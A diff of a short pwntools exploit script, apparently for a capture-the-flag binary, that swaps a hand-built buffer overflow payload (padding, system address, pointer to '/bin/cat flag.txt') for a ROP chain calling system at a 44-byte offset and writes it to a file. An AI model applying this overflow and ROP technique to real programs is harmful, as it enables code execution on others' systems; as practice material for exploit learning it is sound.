@@ -8,19 +8,21 @@ p = process()
 padding = 44
 
 # Locate the functions/strings we need
-system_addr = elf.symbols['system']
 bincat_addr = next(elf.search(b'/bin/cat'))
 
 # Print out the target address
-info("%#x system", system_addr)
 info("%#x /bin/cat", bincat_addr)
 
-payload = flat(
-    asm('nop') * padding,  # Padding to EIP
-    elf.symbols['system'],  # system function - 0xf7dfefa0
-    0x0,  # Return pointer
-    bincat_addr,  # /bin/cat flag.txt address (found using search in pwndbg)
-)
+# Get ROP gadgets
+rop = ROP(elf)
+# Create rop chain calling system('/bin/cat flag.txt')
+rop.system(bincat_addr)
+
+# pprint(rop.gadgets)
+print(rop.chain())
+
+# Inject rop chain at correct offset
+payload = fit({padding: rop.chain()})
 
 # Save payload to file
 f = open("payload", "wb")
